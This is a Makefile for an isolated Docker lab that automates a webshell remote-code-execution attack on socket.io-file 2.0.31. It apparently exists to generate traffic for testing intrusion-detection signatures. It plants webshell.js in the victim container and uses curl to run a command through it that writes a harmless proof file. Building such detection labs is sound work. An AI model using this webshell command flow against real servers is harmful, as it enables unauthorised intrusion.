STACK_ID := 6_socketiofile_webshell
DRY_RUN_TAG := RTC_DRY_RUN
SCENARIO ?= 6
ATTACK_TYPE := remote_code_execution
EXPECTED_SIDS := 2000006
DISABLE_SHARED_LIFECYCLE_TARGETS := 1
include ../shared.mk

SERVICE ?=
NET_PREFIX ?= 10.16.$(INSTANCE_INDEX)
LAB_SUBNET ?= $(NET_PREFIX).0/24
VICTIM_IP ?= $(NET_PREFIX).10
ATTACKER_IP ?= $(NET_PREFIX).100
HTTP_PORT ?= 808$(INSTANCE_INDEX)
RCE_PROOF_FILE ?= /app/public/auto_attack_proof.txt
RCE_PROOF_TEXT ?= RTC_AUTO_ATTACK_RCE_OK
ATTACKER_IMAGE ?= curlimages/curl:8.8.0

export LAB_SUBNET VICTIM_IP ATTACKER_IP HTTP_PORT ATTACKER_IMAGE

run:
	@$(COMPOSE) up -d --remove-orphans

start: run

stop:
	@$(COMPOSE) down --remove-orphans

rebuild:
	@$(COMPOSE) down --rmi all --remove-orphans || true
	@$(COMPOSE) build --no-cache $(SERVICE)
build:
	@$(COMPOSE) build --no-cache $(SERVICE)


dry-run:
	@echo "$(DRY_RUN_TAG)_BEGIN stack=$(STACK_ID)"
	@curl -fsS http://127.0.0.1:$(HTTP_PORT)/ >/dev/null || { \
		echo "$(DRY_RUN_TAG)_FAIL stack=$(STACK_ID) check=http_home reason=unreachable"; \
		exit 1; \
	}
	@echo "$(DRY_RUN_TAG)_OK stack=$(STACK_ID) check=http_home"
	@$(COMPOSE) exec -T node_socketiofile sh -lc "node -p \"require('socket.io-file/package.json').version\"" 2>/dev/null | grep -qx '2.0.31' || { \
		echo "$(DRY_RUN_TAG)_FAIL stack=$(STACK_ID) check=socketiofile_version reason=unexpected_version"; \
		exit 1; \
	}
	@echo "$(DRY_RUN_TAG)_OK stack=$(STACK_ID) check=socketiofile_version version=2.0.31"
	@echo "$(DRY_RUN_TAG)_OK stack=$(STACK_ID) ready=true"

prepare-webshell:
	# Previous implementation kept for traceability:
	# The manual flow uploads webshell.js through the browser.
	# Change rationale: auto-attack seeds the same payload into the container to keep CI/headless runs deterministic.
	@CID="$$( $(COMPOSE) ps -q node_socketiofile )"; \
	if [ -z "$$CID" ]; then echo "[!] node_socketiofile is not running."; exit 1; fi; \
	docker cp ./webshell.js "$$CID:/app/public/webshell.js"

rce-attack:
	@echo "[*] Executing command through uploaded webshell from dedicated attacker container..."
	@$(COMPOSE) exec -T attacker sh -c "curl -sS --get \
		--data-urlencode 'cmd=printf \"%s\" \"$(RCE_PROOF_TEXT)\" > \"$(RCE_PROOF_FILE)\"' \
		'http://node_socketiofile:8080/webshell.js/'" >/tmp/lab6-rce.out

verify-rce:
	# Change rationale: command substitution was evaluated by the host shell instead of the container shell, causing deterministic false negatives.
	@$(COMPOSE) exec -T node_socketiofile sh -lc "grep -Fxq '$(RCE_PROOF_TEXT)' '$(RCE_PROOF_FILE)'" || { \
		echo "[!] RCE proof file was not created with the expected content."; \
		exit 1; \
	}
	@echo "[+] RCE proof verified: $(RCE_PROOF_FILE)"

auto-attack: stop build start
	@$(RTC_EVENT) lab_ready stack=$(STACK_ID) scenario=$(SCENARIO) instance=$(INSTANCE) \
		attacker_ip=$(ATTACKER_IP) victim_ip=$(VICTIM_IP) \
		expected_sids=$(EXPECTED_SIDS) attack_type=$(ATTACK_TYPE) \
		probe_targets=$(ATTACKER_IP),$(VICTIM_IP) probe_protocols=tcp
	@echo "[*] Waiting for node_socketiofile readiness (3 seconds)..."
	@sleep 3
	@$(MAKE) attack
	@$(RTC_EVENT) lab_stop stack=$(STACK_ID) scenario=$(SCENARIO) instance=$(INSTANCE)
	@$(MAKE) stop

attack:
	@$(MAKE) prepare-webshell
	@echo "$(ATTACK_WINDOW_TAG)_BEGIN ts_utc=$$(date -u +"%Y-%m-%dT%H:%M:%SZ") stack=$(STACK_ID) scenario=$(SCENARIO) instance=$(INSTANCE) attack=$(ATTACK_TYPE)"
	@$(MAKE) rce-attack
	@echo "$(ATTACK_WINDOW_TAG)_END ts_utc=$$(date -u +"%Y-%m-%dT%H:%M:%SZ") stack=$(STACK_ID) scenario=$(SCENARIO) instance=$(INSTANCE) attack=$(ATTACK_TYPE)"
	@$(MAKE) verify-rce
